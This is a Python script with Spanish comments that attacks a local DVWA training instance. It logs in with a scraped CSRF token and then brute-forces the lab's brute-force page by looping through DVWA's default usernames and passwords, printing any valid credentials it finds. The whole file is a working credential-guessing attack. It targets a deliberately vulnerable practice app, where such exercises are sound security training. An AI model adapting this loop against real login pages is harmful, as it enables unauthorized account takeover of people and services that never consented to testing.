import requests
import time

# Configuración
DVWA_URL = "http://localhost:8081"
LOGIN_URL = f"{DVWA_URL}/login.php"
BRUTE_URL = f"{DVWA_URL}/vulnerabilities/brute/"
USERNAME = "admin"
PASSWORD = "password"

def get_csrf_token(session):
    """Obtiene token CSRF sin BeautifulSoup"""
    response = session.get(LOGIN_URL)
    token_start = response.text.find('user_token" value="') + 18
    token_end = response.text.find('"', token_start)
    token = response.text[token_start:token_end]
    print(f"[DEBUG] Token CSRF obtenido: {token}")  # ← Debug aquí
    return token

def login(session):
    """Inicia sesión en DVWA"""
    csrf_token = get_csrf_token(session)
    
    data = {
        'username': USERNAME,
        'password': PASSWORD,
        'Login': 'Login',
        'user_token': csrf_token
    }
    
    response = session.post(LOGIN_URL, data=data)
    print(f"[DEBUG] Cookies después de login: {session.cookies.get_dict()}")  # ← Debug aquí
    return "Login failed" not in response.text

def brute_force(session):
    """Ataque de fuerza bruta básico"""
    valid_creds = []
    users = ["admin", "gordonb", "1337", "pablo"]  # Usuarios por defecto DVWA
    passwords = ["password", "abc123", "charley", "letmein"]  # Contraseñas por defecto
    
    for user in users:
        for pwd in passwords:
            try:
                params = {
                    'username': user,
                    'password': pwd,
                    'Login': 'Login'
                }
                response = session.get(BRUTE_URL, params=params)
                
                if "Welcome" in response.text or response.status_code == 302:
                    print(f"[+] Credenciales válidas: {user}:{pwd}")
                    valid_creds.append((user, pwd))
                    
                    if len(valid_creds) >= 2:
                        return valid_creds
                
                time.sleep(0.5)
            
            except Exception as e:
                print(f"[-] Error probando {user}:{pwd}: {str(e)}")
                continue
    
    return valid_creds

def main():
    print("=== Ataque a DVWA (Python) ===")
    
    with requests.Session() as session:
        if login(session):
            print("[+] Sesión iniciada correctamente")
            print("[+] Iniciando fuerza bruta...")
            results = brute_force(session)
            
            print("\nResultados:")
            for i, (user, pwd) in enumerate(results, 1):
                print(f"{i}. Usuario: {user}\tContraseña: {pwd}")
        else:
            print("[-] Error: Credenciales de DVWA incorrectas o fallo de login")

if __name__ == "__main__":
    main()